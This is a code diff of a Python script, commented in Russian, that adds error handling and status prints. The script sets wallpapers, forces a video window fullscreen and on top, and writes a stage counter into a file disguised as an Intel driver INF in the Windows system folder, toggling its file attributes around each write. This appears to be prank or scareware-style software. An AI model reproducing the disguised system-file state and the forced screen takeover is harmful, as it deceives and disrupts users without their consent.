@@ -24,8 +24,12 @@ file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
 ###
 
 def set_wallpaper(image_path):
-    image_path = os.path.abspath(image_path)
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+    try:
+        image_path = os.path.abspath(image_path)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+    except Exception as e:
+        print(f"[Ошибка установки обоев] {e}")
+
 
 def set_window_always_on_top(window_title="MoviePy"):
     # Функция в цикле ищет окно с указанным заголовком и устанавливает его как topmost.
@@ -49,16 +53,24 @@ def set_file_attributes(file_path):
 
 
 def change_txt_2():
-    remove_file_attributes(file_path)
-    with open(file_path, "w") as f:
-        f.write("2")
-        set_file_attributes(file_path)
+    try:
+        remove_file_attributes(file_path)
+        with open(file_path, "w") as f:
+            f.write("2")
+            set_file_attributes(file_path)
+            print("Цифра файла txt была сменена на 2 успешно")
+    except Exception as e:
+        print(f"Ошибка: {e}")
 
 def change_txt_3():
-    remove_file_attributes(file_path)
-    with open(file_path, "w") as f:
-        f.write("3")
-        set_file_attributes(file_path)
+    try:
+        remove_file_attributes(file_path)
+        with open(file_path, "w") as f:
+            f.write("3")
+            set_file_attributes(file_path)
+            print("Цифра файла txt была сменена на 3 успешно")
+    except Exception as e:
+        print(f"Ошибка: {e}")
 
 def play_video_fullscreen(video_path):
     stop_event.set()
